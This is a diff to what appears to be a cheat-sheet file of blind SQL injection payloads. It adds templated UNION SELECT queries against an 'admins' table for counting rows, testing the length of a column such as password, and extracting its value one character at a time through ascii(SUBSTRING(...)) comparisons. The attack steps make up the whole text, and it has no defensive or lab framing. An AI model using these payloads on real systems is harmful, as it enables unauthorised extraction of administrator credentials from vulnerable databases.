@@ -34,9 +34,40 @@
 
 
 
-2. Dump the Length of the Column Value for a Specific Row
+- 2. Dump the Length of the Column Value for a Specific Row:
 For row {row_index}, determine the length of the value in {column_name}:
 ' UNION SELECT 1 WHERE (SELECT LENGTH({column_name}) FROM admins LIMIT {row_index},1) = {length}-- -
 Replace {column_name} with the column name you want to target (e.g., password).
 Replace {row_index} with the index of the row (0 for the first row, 1 for the second, etc.).
 Replace {length} with the length you want to test.
+
+
+
+
+
+- 1. Determine the Number of Rows:
+' UNION SELECT 1 WHERE (SELECT COUNT(*) FROM admins) = {row_count}-- -
+Replace {row_count} with the number of rows you are testing.
+
+
+- 2. Dump the Length of the Column Value for a Specific Row:
+For row {row_index}, determine the length of the value in {column_name}:
+
+' UNION SELECT 1 WHERE (SELECT LENGTH({column_name}) FROM admins LIMIT {row_index},1) = {length}-- -
+Replace {column_name} with the column name you want to target (e.g., password).
+Replace {row_index} with the index of the row (0 for the first row, 1 for the second, etc.).
+Replace {length} with the length you want to test.
+
+- 3. Dump the Column Value Character by Character:
+To extract the value of {column_name} for row {row_index}, one character at a time:
+
+
+' UNION SELECT 1 WHERE ascii(SUBSTRING((SELECT {column_name} FROM admins LIMIT {row_index},1), {position}, 1)) = {ascii_value}-- -
+Replace {column_name} with the column name (e.g., password).
+Replace {row_index} with the index of the row (e.g., 0 for the first row).
+Replace {position} with the position of the character to extract (1 for the first character, 2 for the second, etc.).
+
+
+
+
+
